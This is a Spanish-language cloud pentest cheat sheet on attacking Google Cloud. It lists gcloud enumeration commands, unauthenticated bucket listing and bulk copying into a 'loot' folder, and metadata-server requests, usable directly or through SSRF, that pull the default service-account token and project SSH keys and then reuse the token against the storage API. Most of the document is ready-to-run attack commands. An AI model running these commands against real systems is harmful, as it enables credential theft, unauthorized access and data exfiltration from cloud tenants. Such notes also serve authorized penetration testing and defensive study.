# GCP -- Ataques y Misconfiguraciones

---

## Configuracion inicial

```bash
# Login
gcloud auth login
gcloud auth activate-service-account --key-file=service-account.json

# Proyecto activo
gcloud config get-value project
gcloud projects list
gcloud config set project PROJECT_ID
```

---

## Enumeracion

```bash
# Identidad actual
gcloud auth list
gcloud config list

# Recursos
gcloud compute instances list
gcloud storage buckets list
gcloud functions list
gcloud sql instances list
gcloud container clusters list

# IAM
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts list
```

---

## GCS Buckets -- Misconfiguraciones

```bash
# Acceso sin autenticacion
curl -s "https://storage.googleapis.com/NOMBRE-BUCKET/?list-type=2"

# Con gsutil
gsutil ls gs://NOMBRE-BUCKET
gsutil cp gs://NOMBRE-BUCKET/archivo.txt .

# Permisos del bucket
gsutil iam get gs://NOMBRE-BUCKET
# Si aparece allUsers -> publico!

# Descargar todo el contenido publico
gsutil -m cp -r gs://NOMBRE-BUCKET ./loot
```

---

## Metadata de instancias GCP

```bash
# Desde instancia GCP (o via SSRF)
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/"
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Usar el token obtenido
TOKEN=$(curl -sH "Metadata-Flavor: Google" ".../token" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
curl -H "Authorization: Bearer $TOKEN" "https://www.googleapis.com/storage/v1/b?project=PROJECT_ID"
```
